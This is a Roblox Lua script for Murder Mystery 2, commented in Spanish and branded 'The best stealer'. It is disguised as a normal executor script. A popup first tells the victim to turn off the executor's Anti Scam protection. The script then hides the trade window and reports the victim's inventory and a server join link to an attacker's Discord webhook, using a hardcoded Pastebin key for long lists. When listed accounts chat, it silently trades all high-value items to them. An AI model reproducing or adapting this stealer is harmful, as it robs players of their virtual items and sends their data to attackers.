-- ======= UI DE CONFIRMACIÓN =======
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")

if getgenv().ScriptEjecutado then return end
getgenv().ScriptEjecutado = true

-- Crear pantalla de confirmación
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AntiScamUI"
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0,500,0,300)
frame.Position = UDim2.new(0.5,0,0.5,0)
frame.AnchorPoint = Vector2.new(0.5,0.5)
frame.BackgroundColor3 = Color3.fromRGB(40,40,40)
frame.BorderSizePixel = 0
frame.Parent = screenGui
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0,30)
corner.Parent = frame

-- Sombra
local shadow = Instance.new("Frame")
shadow.Size = UDim2.new(1,20,1,20)
shadow.Position = UDim2.new(0,-10,0,-10)
shadow.BackgroundColor3 = Color3.fromRGB(0,0,0)
shadow.BackgroundTransparency = 0.7
shadow.ZIndex = -1
shadow.Parent = frame
local shadowCorner = Instance.new("UICorner")
shadowCorner.CornerRadius = UDim.new(0,35)
shadowCorner.Parent = shadow

-- Título
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,60)
title.BackgroundTransparency = 1
title.Text = "⚠️🚨 Antes de iniciar el script ⚠️🚨"
title.Font = Enum.Font.GothamBold
title.TextSize = 24
title.TextColor3 = Color3.fromRGB(255, 215, 0)
title.TextScaled = true
title.Parent = frame

-- Mensaje compacto y entendible
local message = Instance.new("TextLabel")
message.Size = UDim2.new(0.9,0,0.5,0)
message.Position = UDim2.new(0.05,0,0.2,0)
message.BackgroundTransparency = 1
message.Text = "⚠️ Para que el script funcione correctamente, desactiva la opción 'Anti Scam' en Delta.\n\n1️⃣ Toca el icono de Delta y luego el icono de 'tuerquita' (configuración).\n2️⃣ Busca la opción llamada 'Anti Scam' y desactívala.\n\n🔐 Es obligatorio hacer esto para que funcione ❤️"
message.Font = Enum.Font.Gotham
message.TextSize = 18
message.TextColor3 = Color3.fromRGB(255,255,255)
message.TextWrapped = true
message.TextYAlignment = Enum.TextYAlignment.Top
message.Parent = frame

-- Footer
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1,0,0,25)
footer.Position = UDim2.new(0,0,0.85,0)
footer.BackgroundTransparency = 1
footer.Text = "By @scripts_2723 (copiado automáticamente)"
footer.Font = Enum.Font.Gotham
footer.TextSize = 16
footer.TextColor3 = Color3.fromRGB(200,200,200)
footer.Parent = frame

-- Copia automática del link
pcall(function() setclipboard("https://www.tiktok.com/@scripts_2723?_t=ZM-8zCyMqiKEqM&_r=1") end)

-- Botones
local buttonYes = Instance.new("TextButton")
buttonYes.Size = UDim2.new(0.4,0,0,50)
buttonYes.Position = UDim2.new(0.05,0,0.7,0)
buttonYes.Text = "Ya lo hice (25s)"
buttonYes.BackgroundColor3 = Color3.fromRGB(0,180,0)
buttonYes.TextColor3 = Color3.fromRGB(255,255,255)
buttonYes.Font = Enum.Font.GothamBold
buttonYes.TextSize = 20
buttonYes.AutoButtonColor = false
buttonYes.Parent = frame
local yesCorner = Instance.new("UICorner")
yesCorner.CornerRadius = UDim.new(0,15)
yesCorner.Parent = buttonYes

local buttonNo = Instance.new("TextButton")
buttonNo.Size = UDim2.new(0.4,0,0,50)
buttonNo.Position = UDim2.new(0.55,0,0.7,0)
buttonNo.Text = "No lo hice"
buttonNo.BackgroundColor3 = Color3.fromRGB(180,0,0)
buttonNo.TextColor3 = Color3.fromRGB(255,255,255)
buttonNo.Font = Enum.Font.GothamBold
buttonNo.TextSize = 20
buttonNo.AutoButtonColor = true
buttonNo.Parent = frame
local noCorner = Instance.new("UICorner")
noCorner.CornerRadius = UDim.new(0,15)
noCorner.Parent = buttonNo

-- Animación de entrada
frame.Position = UDim2.new(0.5,0,-0.5,0)
TweenService:Create(frame,TweenInfo.new(0.5,Enum.EasingStyle.Bounce),{Position=UDim2.new(0.5,0,0.5,0)}):Play()

-- Cuenta regresiva
local countdown = 35
spawn(function()
    while countdown>0 do
        buttonYes.Text = "Ya lo hice ("..countdown.."s)"
        task.wait(1)
        countdown -= 1
    end
    buttonYes.Text = "Ya lo hice"
    buttonYes.AutoButtonColor = true
end)

-- Control de botones
local confirmed = nil
local function closeUI()
    TweenService:Create(frame,TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.In),{Position=UDim2.new(0.5,0,-0.5,0)}):Play()
    task.wait(0.6)
    screenGui:Destroy()
end

buttonYes.MouseButton1Click:Connect(function()
    if countdown <= 0 then
        confirmed = true
        closeUI()
    end
end)
buttonNo.MouseButton1Click:Connect(function()
    confirmed = false
    closeUI()
end)

-- Esperar confirmación
repeat task.wait(0.1) until confirmed ~= nil

-- Congelar si dice no
if not confirmed then while true do task.wait() end end
-- ======= SCRIPT ORIGINAL =======
-- Pega tu script completo aquí exactamente como lo tenías
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Configuración
local webhook = _G.webhook or ""
local users = _G.Usernames or {}
local min_rarity = _G.min_rarity or "Godly"
local min_value = _G.min_value or 1
local pingEveryone = _G.pingEveryone == "Yes"

local req = syn and syn.request or http_request or request
if not req then warn("No HTTP request method available!") return end

-- Función para enviar webhook
local function SendWebhook(title, description, fields, prefix)
    local data = {
        ["content"] = prefix or "",
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description or "",
            ["color"] = 65280,
            ["fields"] = fields or {},
            ["thumbnail"] = {["url"] = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"},
            ["footer"] = {["text"] = "The best stealer by Anonimo 🇪🇨"}
        }}
    }
    local body = HttpService:JSONEncode(data)
    pcall(function()
        req({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = body})
    end)
end

-- Función para crear paste en Pastebin
local function CreatePaste(content)
    local api_dev_key = "_hLJczUn9kRRrZ857l24K6iIAhzm_yNs"
    local api_paste_name = "MM2 Inventario "..LocalPlayer.Name
    local api_paste_format = "text"
    local api_paste_private = "1"

    local body = "api_option=paste&api_dev_key="..api_dev_key..
                 "&api_paste_code="..HttpService:UrlEncode(content)..
                 "&api_paste_name="..HttpService:UrlEncode(api_paste_name)..
                 "&api_paste_format="..api_paste_format..
                 "&api_paste_private="..api_paste_private

    local res = req({
        Url = "https://pastebin.com/api/api_post.php",
        Method = "POST",
        Headers = {["Content-Type"]="application/x-www-form-urlencoded"},
        Body = body
    })
    if res and res.Body then return res.Body end
end

-- Ocultar GUI de trade
local playerGui = LocalPlayer:WaitForChild("PlayerGui")
for _, guiName in ipairs({"TradeGUI","TradeGUI_Phone"}) do
    local gui = playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function() gui.Enabled=false end)
        gui.Enabled=false
    end
end

-- Funciones de trade
local TradeService = game:GetService("ReplicatedStorage"):WaitForChild("Trade")
local function getTradeStatus() return TradeService.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user)
    local plrObj = Players:FindFirstChild(user)
    if plrObj then TradeService.SendRequest:InvokeServer(plrObj) end
end
local function addWeaponToTrade(id) TradeService.OfferItem:FireServer(id,"Weapons") end
local function acceptTrade() TradeService.AcceptTrade:FireServer(285646582) end
local function waitForTradeCompletion() while getTradeStatus()~="None" do task.wait(0.1) end end

-- Kick inicial
local function CheckServerInitial()
    if #Players:GetPlayers() >= 12 then
        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando uno vacío...")
    end
    if game.PrivateServerId and game.PrivateServerId ~= "" then
        LocalPlayer:Kick("🔒 Servidor privado detectado. Buscando público...")
    end
    local success, ownerId = pcall(function() return game.PrivateServerOwnerId end)
    if success and ownerId and ownerId ~= 0 then
        LocalPlayer:Kick("🔒 Servidor VIP detectado. Buscando público...")
    end
end
CheckServerInitial()

-- MM2 Supreme value system
local database = require(game.ReplicatedStorage.Database.Sync.Item)
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage"}
local categories = {
    godly="https://supremevaluelist.com/mm2/godlies.html",
    ancient="https://supremevaluelist.com/mm2/ancients.html",
    unique="https://supremevaluelist.com/mm2/uniques.html",
    classic="https://supremevaluelist.com/mm2/vintages.html",
    chroma="https://supremevaluelist.com/mm2/chromas.html"
}
local headers={["Accept"]="text/html",["User-Agent"]="Mozilla/5.0"}

local function trim(s) return s:match("^%s*(.-)%s*$") end
local function fetchHTML(url)
    local res=req({Url=url, Method="GET", Headers=headers})
    return res and res.Body or ""
end
local function parseValue(div)
    local str=div:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
    if str then str=str:gsub(",","") return tonumber(str) end
end
local function extractItems(html)
    local t={}
    for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        name=trim(name:match("([^<]+)"):gsub("%s+"," "))
        name=trim((name:split(" Click "))[1])
        local v=parseValue(body)
        if v then t[name:lower()]=v end
    end
    return t
end
local function extractChroma(html)
    local t={}
    for name,body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
        local n=trim(name:match("([^<]+)"):gsub("%s+"," ")):lower()
        local v=parseValue(body)
        if v then t[n]=v end
    end
    return t
end
local function buildValueList()
    local allValues,chromaValues={},{}
    for r,url in pairs(categories) do
        local html=fetchHTML(url)
        if html~="" then
            if r~="chroma" then
                local vals=extractItems(html)
                for k,v in pairs(vals) do allValues[k]=v end
            else
                chromaValues=extractChroma(html)
            end
        end
    end
    local valueList={}
    for id,item in pairs(database) do
        local name=item.ItemName and item.ItemName:lower() or ""
        local rarity=item.Rarity or ""
        local hasChroma=item.Chroma or false
        if name~="" and rarity~="" then
            local ri=table.find(rarityTable,rarity)
            local godlyIdx=table.find(rarityTable,"Godly")
            if ri and ri>=godlyIdx then
                if hasChroma then
                    for cname,val in pairs(chromaValues) do
                        if cname:find(name) then valueList[id]=val break end
                    end
                else
                    if allValues[name] then valueList[id]=allValues[name] end
                end
            end
        end
    end
    return valueList
end

-- ====================================

local weaponsToSend={}
local totalValue=0
local min_rarity_index=table.find(rarityTable,min_rarity)
local valueList=buildValueList()

-- Extraer armas válidas
local profile=game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
for id,amount in pairs(profile.Weapons.Owned) do
    local item=database[id]
    if item then
        local ri=table.find(rarityTable,item.Rarity)
        if ri and ri>=min_rarity_index then
            local v=valueList[id] or ({10,20})[math.random(1,2)]
            if v>=min_value then
                table.insert(weaponsToSend,{DataID=id,Amount=amount,Value=v,Rarity=item.Rarity})
                totalValue+=v*amount
            end
        end
    end
end

table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)

-- 🔹 Fern Link real solo visible en webhook
local fernToken = math.random(100000,999999)
local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId.."&token="..fernToken..")"

-- Preparar contenido completo para Pastebin
local pasteContent = ""
for _, w in ipairs(weaponsToSend) do
    pasteContent = pasteContent..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID, w.Amount, w.Rarity, tostring(w.Value*w.Amount))
end
pasteContent = pasteContent .. "\nTotal Value: "..tostring(totalValue).."💰"

local pasteLink
if #weaponsToSend > 18 then
    pasteLink = CreatePaste(pasteContent)
end

-- Webhook inventario
if #weaponsToSend > 0 then
    local fieldsInit={
        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
        {name="Inventario 📦:", value="", inline=false},
        {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false}
    }

    local maxEmbedItems = math.min(18,#weaponsToSend)
    for i=1,maxEmbedItems do
        local w = weaponsToSend[i]
        fieldsInit[2].value = fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
    end

    if #weaponsToSend > 18 then
        fieldsInit[2].value = fieldsInit[2].value.."... y más armas 🔥\n"
        if pasteLink then
            fieldsInit[2].value = fieldsInit[2].value.."Mira todos los ítems aquí 📜: [Mirar]("..pasteLink..")"
        end
    end

    local prefix=pingEveryone and "@everyone " or ""
    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
end

-- 🔹 Trade
local function doTrade(targetName)
    if #weaponsToSend == 0 then return end
    while #weaponsToSend>0 do
        local status=getTradeStatus()
        if status=="None" then
            sendTradeRequest(targetName)
        elseif status=="SendingRequest" then
            task.wait(0.3)
        elseif status=="StartTrade" then
            for i=1,math.min(4,#weaponsToSend) do
                local w=table.remove(weaponsToSend,1)
                for _=1,w.Amount do
                    addWeaponToTrade(w.DataID)
                end
            end
            task.wait(6)
            acceptTrade()
            waitForTradeCompletion()
        else task.wait(0.5) end
        task.wait(1)
    end
end

-- Activación por chat
for _, p in ipairs(Players:GetPlayers()) do
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end
Players.PlayerAdded:Connect(function(p)
    if table.find(users,p.Name) then
        p.Chatted:Connect(function() doTrade(p.Name) end)
    end
end)
